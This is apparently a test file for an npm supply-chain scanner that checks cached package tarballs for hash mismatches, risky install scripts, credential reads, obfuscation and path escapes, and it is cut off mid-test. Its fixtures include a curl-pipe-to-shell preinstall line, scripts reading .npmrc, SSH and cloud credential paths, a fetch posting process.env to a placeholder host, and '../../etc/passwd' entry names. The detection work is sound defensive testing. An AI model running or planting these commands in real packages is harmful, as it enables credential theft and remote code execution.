import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import http from 'node:http';
import https from 'node:https';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

import { afterEach, describe, expect, it } from 'vitest';

import { laneFindings, laneRows } from '../../../../../src/modules/deps/npm/lane-d.js';
import type { NpmDepthInput } from '../../../../../src/modules/deps/npm/types.js';

const FLAGS = [
  'NPM_TARBALL_HASH',
  'NPM_TARBALL_ID',
  'NPM_TARBALL_LIFECYCLE',
  'NPM_TARBALL_NET',
  'NPM_TARBALL_SHELL',
  'NPM_TARBALL_CRED',
  'NPM_TARBALL_OBFUSC',
  'NPM_TARBALL_BIN',
  'NPM_TARBALL_NATIVE',
  'NPM_TARBALL_HOOK',
  'NPM_TARBALL_HIDDEN',
  'NPM_TARBALL_PATH',
  'NPM_TARBALL_SIZE',
  'NPM_TARBALL_LICENSE',
  'NPM_TARBALL_MANIFEST',
  'NPM_TARBALL_INSTALLJS',
  'NPM_TARBALL_TOPLEVEL',
  'NPM_TARBALL_ENV',
  'NPM_TARBALL_DYNAMIC',
  'NPM_TARBALL_GATE',
  'NPM_REG_INTEGRITY',
] as const;

const dirs: string[] = [];

function enable(...flags: string[]): void {
  for (const flag of FLAGS) {delete process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`];}
  for (const flag of flags) {process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`] = '1';}
}

afterEach(async () => {
  for (const flag of FLAGS) {delete process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`];}
  for (const dir of dirs.splice(0)) {await rm(dir, { recursive: true, force: true });}
});

async function tempDir(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'fullshield-lane-d-'));
  dirs.push(dir);
  return dir;
}

function digest(bytes: Buffer): string {
  return `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
}

function registryUrl(name: string, version: string): string {
  const base = name.startsWith('@') ? name.replace('/', '%2f') : name;
  const leaf = name.includes('/') ? name.slice(name.indexOf('/') + 1) : name;
  return `https://registry.npmjs.org/${base}/-/${leaf}-${version}.tgz`;
}

interface Spec {
  name: string;
  version: string;
  integrity?: string;
  resolved?: string;
  dev?: boolean;
  nested?: boolean;
}

function lockAndManifest(specs: readonly Spec[]): { lock: string; manifest: string } {
  const dependencies: Record<string, string> = {};
  const devDependencies: Record<string, string> = {};
  const packages: Record<string, unknown> = {
    '': { name: 'app', version: '1.0.0', dependencies, devDependencies },
  };
  for (const spec of specs) {
    const key = spec.nested
      ? `node_modules/parent/node_modules/${spec.name}`
      : `node_modules/${spec.name}`;
    if (!spec.nested && spec.dev === true) {devDependencies[spec.name] = spec.version;}
    if (!spec.nested && spec.dev !== true) {dependencies[spec.name] = spec.version;}
    packages[key] = {
      version: spec.version,
      ...(spec.integrity === undefined ? {} : { integrity: spec.integrity }),
      ...(spec.resolved === undefined ? {} : { resolved: spec.resolved }),
      ...(spec.dev === true ? { dev: true } : {}),
    };
  }
  return {
    lock: JSON.stringify({ name: 'app', lockfileVersion: 3, packages }),
    manifest: JSON.stringify({ name: 'app', version: '1.0.0', dependencies, devDependencies }),
  };
}

async function writeJson(path: string, body: unknown): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, JSON.stringify(body));
}

async function writeDescriptor(
  cache: string,
  name: string,
  entries: Record<string, string>,
  bytes?: Buffer,
): Promise<void> {
  await writeJson(join(cache, 'tarballs', `${name}.json`), {
    integrity: 'sha512-descriptor',
    ...(bytes === undefined ? {} : { bytesBase64: bytes.toString('base64') }),
    entries,
  });
}

async function writePackument(
  cache: string,
  name: string,
  version: string,
  versionDoc: Record<string, unknown>,
): Promise<void> {
  await writeJson(join(cache, 'registry', `${name}.json`), {
    packument: { versions: { [version]: versionDoc } },
  });
}

function pkgEntries(
  name: string,
  version: string,
  extra: Record<string, unknown> = {},
  files: Record<string, string> = {},
): Record<string, string> {
  return {
    'package/package.json': JSON.stringify({ name, version, ...extra }),
    'package/lib/index.js': 'module.exports = 1;\n',
    ...files,
  };
}

async function scan(cache: string, specs: readonly Spec[]): Promise<{ ruleId: string; severity: string; snippet?: string; message: string }[]> {
  const { lock, manifest } = lockAndManifest(specs);
  const input: NpmDepthInput = {
    cwd: cache,
    files: ['package.json', 'package-lock.json'],
    manifestRaw: manifest,
    lockTexts: { 'package-lock.json': lock },
    cacheDir: cache,
    offline: true,
  };
  return laneFindings(input);
}

function ids(findings: readonly { ruleId: string }[]): string[] {
  return findings.map((finding) => finding.ruleId).sort();
}

function blockNetwork(): { count: () => number; restore: () => void } {
  let calls = 0;
  const previous = {
    fetch: globalThis.fetch,
    httpRequest: http.request,
    httpsRequest: https.request,
    httpGet: http.get,
    httpsGet: https.get,
  };
  const fail = () => {
    calls += 1;
    throw new Error('network blocked');
  };
  globalThis.fetch = fail;
  http.request = fail;
  https.request = fail;
  http.get = fail;
  https.get = fail;
  return {
    count: () => calls,
    restore: () => {
      globalThis.fetch = previous.fetch;
      http.request = previous.httpRequest;
      https.request = previous.httpsRequest;
      http.get = previous.httpGet;
      https.get = previous.httpsGet;
    },
  };
}

function ustar(files: Record<string, string>): Buffer {
  const blocks: Buffer[] = [];
  for (const [name, content] of Object.entries(files)) {
    const header = Buffer.alloc(512);
    Buffer.from(name).copy(header, 0, 0, Math.min(100, Buffer.byteLength(name)));
    header.write('0000644\0', 100, 'ascii');
    header.write('0000000\0', 108, 'ascii');
    header.write('0000000\0', 116, 'ascii');
    const size = Buffer.byteLength(content);
    header.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'ascii');
    header.write('00000000000\0', 136, 'ascii');
    header.fill(0x20, 148, 156);
    header[156] = 48;
    header.write('ustar\0', 257, 'ascii');
    header.write('00', 263, 'ascii');
    let sum = 0;
    for (const byte of header) {sum += byte;}
    header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'ascii');
    blocks.push(header);
    const body = Buffer.from(content);
    blocks.push(body);
    if (body.length % 512 !== 0) {blocks.push(Buffer.alloc(512 - (body.length % 512)));}
  }
  blocks.push(Buffer.alloc(1024));
  return Buffer.concat(blocks);
}

const PLACEHOLDER = digest(Buffer.from('placeholder-integrity'));

describe('lane D tarball bytes', () => {
  it('lists every npmRow rule id', async () => {
    const source = await readFile(
      fileURLToPath(new URL('../../../../../src/modules/deps/npm/lane-d.ts', import.meta.url)),
      'utf8',
    );
    const fromSource = [...source.matchAll(/npmRow\('([^']+)', '(CWE-[^']+)'\)/g)].map((match) => match[1]);
    expect(fromSource).toHaveLength(20);
    expect(laneRows.map((row) => row.ruleId)).toEqual(fromSource);
    expect(new Set(laneRows.map((row) => row.cwe)).size).toBeGreaterThan(0);
  });

  it('emits nothing when the flags are off', async () => {
    enable();
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9', {}, {
      'package/.git/hooks/pre-commit': '#!/bin/sh\n',
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('flags a tarball hash mismatch and stops extraction', async () => {
    enable('NPM_TARBALL_HASH', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    const bytes = Buffer.from('not-the-real-tarball');
    const integrity = digest(Buffer.from('expected-bytes'));
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9'), bytes);
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-HASH-001']);
    expect(findings[0]?.severity).toBe('critical');
  });

  it('accepts tarball bytes whose sha512 matches the lock', async () => {
    enable('NPM_TARBALL_HASH', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    const bytes = Buffer.from('matching-tarball-bytes');
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3'), bytes);
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      integrity: digest(bytes),
    }]);
    expect(findings).toEqual([]);
  });

  it('hashes cached bytes against packument dist.integrity when the lock has none', async () => {
    enable('NPM_TARBALL_HASH');
    const cache = await tempDir();
    const bytes = Buffer.from('packument-bytes');
    await writePackument(cache, 'left-pad', '1.2.3', {
      dist: {
        integrity: digest(Buffer.from('other-bytes')),
        tarball: registryUrl('left-pad', '1.2.3'),
      },
    });
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3'), bytes);
    const findings = await scan(cache, [{
      name: 'left-pad',
      version: '1.2.3',
      resolved: registryUrl('left-pad', '1.2.3'),
    }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-HASH-001']);
  });

  it('flags a tarball name or version that differs from the lock', async () => {
    enable('NPM_TARBALL_ID');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('right-pad', '1.2.3'));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '9.9.9'));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-ID-001', 'DEPS-TARBALL-ID-001']);
    expect(findings.every((finding) => finding.severity === 'critical')).toBe(true);
  });

  it('accepts a tarball whose name and version match', async () => {
    enable('NPM_TARBALL_ID');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3'));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('reads a ustar body from the integrity filename when no descriptor entries exist', async () => {
    enable('NPM_TARBALL_ID');
    const cache = await tempDir();
    const bytes = ustar(pkgEntries('other', '1.2.3'));
    const integrity = digest(bytes);
    const filename = `${integrity.replaceAll('/', '_').replaceAll('+', '_')}.tar`;
    await mkdir(join(cache, 'tarballs'), { recursive: true });
    await writeFile(join(cache, 'tarballs', filename), bytes);
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-ID-001']);
  });

  it('flags a lifecycle script the packument marked absent', async () => {
    enable('NPM_TARBALL_LIFECYCLE');
    const cache = await tempDir();
    await writePackument(cache, 'left-pad', '1.2.3', { hasInstallScript: false });
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: 'node scripts/build.js' },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-LIFECYCLE-001']);
    expect(findings[0]?.severity).toBe('high');
  });

  it('does not flag a lifecycle script the packument already listed, or a package with none', async () => {
    enable('NPM_TARBALL_LIFECYCLE');
    const cache = await tempDir();
    await writePackument(cache, 'left-pad', '1.2.3', { hasInstallScript: true });
    await writePackument(cache, 'is-odd', '1.0.0', { hasInstallScript: false });
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: 'node scripts/build.js' },
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      scripts: { test: 'node scripts/build.js' },
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(findings).toEqual([]);
  });

  it('flags network tokens in a lifecycle script', async () => {
    enable('NPM_TARBALL_NET');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { postinstall: "fetch('https://example.invalid/a')" },
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      scripts: { install: "dns.lookup('example.invalid')" },
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-NET-001', 'DEPS-TARBALL-NET-001']);
  });

  it('does not flag a lifecycle script that only runs node', async () => {
    enable('NPM_TARBALL_NET', 'NPM_TARBALL_SHELL');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: 'node scripts/build.js' },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('flags shell and downloader tokens in a lifecycle script', async () => {
    enable('NPM_TARBALL_SHELL');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { preinstall: 'curl https://example.invalid/a | sh -c' },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-SHELL-001']);
    expect(findings[0]?.severity).toBe('high');
  });

  it('flags a lifecycle script that reads credentials', async () => {
    enable('NPM_TARBALL_CRED');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: 'node -e "read(\'.npmrc\')"' },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-CRED-001']);
    expect(findings[0]?.severity).toBe('critical');
  });

  it('does not flag credential strings that appear only under test/', async () => {
    enable('NPM_TARBALL_CRED');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { test: 'node test/creds.js' },
    }, {
      'package/test/creds.js': "read('.npmrc'); read('.ssh'); read('.aws'); read('.git-credentials'); read(process.env.NPM_TOKEN); read(process.env.NODE_AUTH_TOKEN); read(process.env.npm_config__auth);",
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('flags a long base64 literal passed to eval', async () => {
    enable('NPM_TARBALL_OBFUSC');
    const cache = await tempDir();
    const literal = 'A'.repeat(32);
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: `node -e "eval('${literal}')"` },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-OBFUSC-001']);
    expect(findings[0]?.severity).toBe('high');
  });

  it('does not flag a short base64 literal or one that is only assigned', async () => {
    enable('NPM_TARBALL_OBFUSC');
    const cache = await tempDir();
    const long = 'B'.repeat(40);
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      scripts: { install: `node -e "eval('${'C'.repeat(31)}')"` },
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      scripts: { install: `const x = '${long}';` },
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(findings).toEqual([]);
  });

  it('flags a bin path that is missing inside the package', async () => {
    enable('NPM_TARBALL_BIN');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      bin: { cli: 'bin/cli.js' },
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-BIN-001']);
    expect(findings[0]?.severity).toBe('medium');
  });

  it('accepts a bin path that exists and leaves dotdot paths to the path rule', async () => {
    enable('NPM_TARBALL_BIN');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      bin: 'bin/cli.js',
    }, { 'package/bin/cli.js': '#!/usr/bin/env node\n' }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      bin: '../evil.js',
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(findings).toEqual([]);
  });

  it('flags a bin path that escapes as a path finding only', async () => {
    enable('NPM_TARBALL_PATH', 'NPM_TARBALL_BIN');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {
      bin: '../evil.js',
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-PATH-001']);
  });

  it('flags a prebuilt .node file and ignores binding.gyp alone', async () => {
    enable('NPM_TARBALL_NATIVE');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/build/addon.node': 'not-a-real-binary',
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {}, {
      'package/binding.gyp': "{ 'targets': [] }\n",
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-NATIVE-001']);
    expect(findings[0]?.message).toContain('prebuilt binary could not be reviewed as source');
    expect(findings[0]?.severity).toBe('medium');
  });

  it('flags a git hook or workflow archived in the tarball', async () => {
    enable('NPM_TARBALL_HOOK');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/.github/workflows/ci.yml': 'name: ci\n',
      'package/.git/hooks/pre-commit': '#!/bin/sh\n',
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-HOOK-001', 'DEPS-TARBALL-HOOK-001']);
    expect(findings.every((finding) => finding.severity === 'critical')).toBe(true);
  });

  it('does not flag a readme that only mentions hook paths', async () => {
    enable('NPM_TARBALL_HOOK');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/README.md': 'See .git/hooks/ and .github/workflows/ in the docs.\n',
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('flags bidi overrides and hidden non-latin segments', async () => {
    enable('NPM_TARBALL_HIDDEN');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/.gitignore': 'node_modules\n',
      'package/lib/index.js': 'module.exports = 1;\n',
      [`package/lib/ind${'\u202E'}ex.js`]: 'module.exports = 2;\n',
      'package/.конфиг.js': 'module.exports = 3;\n',
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-HIDDEN-001', 'DEPS-TARBALL-HIDDEN-001']);
    expect(findings.some((finding) => finding.snippet?.includes('.gitignore'))).toBe(false);
    expect(findings.every((finding) => finding.severity === 'medium')).toBe(true);
  });

  it('flags absolute and dotdot entry names even when later flags are off', async () => {
    enable('NPM_TARBALL_PATH');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', {
      ...pkgEntries('left-pad', '1.2.3'),
      'package/../../etc/passwd': 'x\n',
      '/etc/crontab': 'y\n',
    });
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-PATH-001', 'DEPS-TARBALL-PATH-001']);
    expect(findings.every((finding) => finding.severity === 'critical')).toBe(true);
  });

  it('accepts a normal package-relative path', async () => {
    enable('NPM_TARBALL_PATH');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3'));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('does not extract an escaped entry', async () => {
    enable('NPM_TARBALL_PATH', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', {
      'package/package.json': JSON.stringify({ name: 'left-pad', version: '1.2.3' }),
      '../package/package.json': JSON.stringify({ name: 'stolen', version: '0.0.1' }),
    });
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-PATH-001']);
  });

  it('flags an entry count above 2000 and a small archive does not', async () => {
    enable('NPM_TARBALL_SIZE');
    const cache = await tempDir();
    const many: Record<string, string> = pkgEntries('left-pad', '1.2.3');
    for (let i = 0; i < 2000; i += 1) {many[`package/file-${i}.txt`] = 'a';}
    await writeDescriptor(cache, 'left-pad', many);
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0'));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-SIZE-001']);
    expect(findings[0]?.severity).toBe('info');
    expect(findings[0]?.message).toContain('not a vulnerability count');
  });

  it('flags an unpacked size above 20 MB', async () => {
    enable('NPM_TARBALL_SIZE');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/blob.txt': 'x'.repeat((20 * 1024 * 1024) + 1),
    }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-SIZE-001']);
  }, 30000);

  it('flags a license string that differs and ignores a match or a missing side', async () => {
    enable('NPM_TARBALL_LICENSE');
    const cache = await tempDir();
    await writePackument(cache, 'left-pad', '1.2.3', { license: 'ISC' });
    await writePackument(cache, 'is-odd', '1.0.0', { license: 'MIT' });
    await writePackument(cache, 'is-even', '2.0.0', {});
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { license: 'MIT' }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', { license: 'MIT' }));
    await writeDescriptor(cache, 'is-even', pkgEntries('is-even', '2.0.0', { license: 'MIT' }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
      { name: 'is-even', version: '2.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-LICENSE-001']);
    expect(findings[0]?.severity).toBe('info');
    expect(findings[0]?.message).toContain('does not judge the license');
  });

  it('flags a dependency map that differs and ignores a match', async () => {
    enable('NPM_TARBALL_MANIFEST', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    await writePackument(cache, 'left-pad', '1.2.3', { dependencies: { ms: '^3.0.0' } });
    await writePackument(cache, 'is-odd', '1.0.0', { dependencies: { ms: '^2.0.0' } });
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { dependencies: { ms: '^2.0.0' } }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', { dependencies: { ms: '^2.0.0' } }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-MANIFEST-001']);
    expect(findings[0]?.severity).toBe('high');
  });

  it('does not flag dependencies when either side is missing', async () => {
    enable('NPM_TARBALL_MANIFEST');
    const cache = await tempDir();
    await writePackument(cache, 'left-pad', '1.2.3', {});
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { dependencies: { ms: '^2.0.0' } }));
    const findings = await scan(cache, [{ name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER }]);
    expect(findings).toEqual([]);
  });

  it('flags a loose install.js and ignores a declared script or a missing file', async () => {
    enable('NPM_TARBALL_INSTALLJS');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', {}, {
      'package/install.js': 'module.exports = 1;\n',
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      scripts: { install: 'node install.js' },
    }, { 'package/install.js': 'module.exports = 1;\n' }));
    await writeDescriptor(cache, 'is-even', pkgEntries('is-even', '2.0.0'));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
      { name: 'is-even', version: '2.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-INSTALLJS-001']);
    expect(findings[0]?.severity).toBe('medium');
  });

  it('flags a top-level network or child_process call in main or exports', async () => {
    enable('NPM_TARBALL_TOPLEVEL');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { main: 'lib/index.js' }, {
      'package/lib/index.js': "fetch('https://example.invalid/x');\n",
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', {
      exports: { '.': './run.js' },
    }, {
      'package/run.js': "https.request('https://example.invalid/y');\n",
    }));
    await writeDescriptor(cache, 'is-even', pkgEntries('is-even', '2.0.0', { main: 'main.js' }, {
      'package/main.js': "child_process.spawn('node');\n",
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
      { name: 'is-even', version: '2.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual([
      'DEPS-TARBALL-TOPLEVEL-001',
      'DEPS-TARBALL-TOPLEVEL-001',
      'DEPS-TARBALL-TOPLEVEL-001',
    ]);
    expect(findings.every((finding) => finding.severity === 'high')).toBe(true);
  });

  it('does not flag the same call inside a function, or a file that does not parse', async () => {
    enable('NPM_TARBALL_TOPLEVEL');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { main: 'lib/index.js' }, {
      'package/lib/index.js': "function run() {\n  fetch('https://example.invalid/x');\n  http.request('https://example.invalid/y');\n  child_process.spawn('node');\n}\n",
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', { main: 'broken.js' }, {
      'package/broken.js': "function ( {\nfetch('https://example.invalid/x');\n",
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(findings).toEqual([]);
  });

  it('flags process.env passed to a request and ignores a single property', async () => {
    enable('NPM_TARBALL_ENV');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { main: 'lib/index.js' }, {
      'package/lib/index.js': "function send() {\n  fetch('https://example.invalid/x', { body: process.env });\n}\n",
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', { main: 'lib/index.js' }, {
      'package/lib/index.js': "fetch('https://example.invalid/' + process.env.NODE_ENV);\n",
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-ENV-001']);
    expect(findings[0]?.severity).toBe('critical');
  });

  it('flags a top-level dynamic require or import and ignores a literal or a nested call', async () => {
    enable('NPM_TARBALL_DYNAMIC');
    const cache = await tempDir();
    await writeDescriptor(cache, 'left-pad', pkgEntries('left-pad', '1.2.3', { main: 'lib/index.js' }, {
      'package/lib/index.js': "const name = 'fs';\nrequire(name);\n",
    }));
    await writeDescriptor(cache, 'is-odd', pkgEntries('is-odd', '1.0.0', { exports: './load.js' }, {
      'package/load.js': "const name = 'fs';\nimport(name);\n",
    }));
    await writeDescriptor(cache, 'is-even', pkgEntries('is-even', '2.0.0', { main: 'ok.js' }, {
      'package/ok.js': "function load(name) {\n  require(name);\n  import(name);\n}\nrequire('fs');\n",
    }));
    const findings = await scan(cache, [
      { name: 'left-pad', version: '1.2.3', integrity: PLACEHOLDER },
      { name: 'is-odd', version: '1.0.0', integrity: PLACEHOLDER },
      { name: 'is-even', version: '2.0.0', integrity: PLACEHOLDER },
    ]);
    expect(ids(findings)).toEqual(['DEPS-TARBALL-DYNAMIC-001', 'DEPS-TARBALL-DYNAMIC-001']);
    expect(findings.every((finding) => finding.severity === 'medium')).toBe(true);
  });

  it('refuses one direct tarball with no integrity and does not fetch or scan a transitive package', async () => {
    enable('NPM_TARBALL_GATE', 'NPM_TARBALL_HOOK', 'NPM_TARBALL_HASH', 'NPM_TARBALL_ID');
    const cache = await tempDir();
    const bytes = Buffer.from('mismatched');
    await writeDescriptor(cache, 'left-pad', pkgEntries('other', '9.9.9', {}, {
      'package/.github/workflows/ci.yml': 'name: ci\n',
    }), bytes);
    await writeDescriptor(cache, 'inner', pkgEntries('inner', '1.0.0', {}, {
      'package/.git/hooks/pre-commit': '#!/bin/sh\n',
    }));
    const net = blockNetwork();
    try {
      const findings = await scan(cache, [
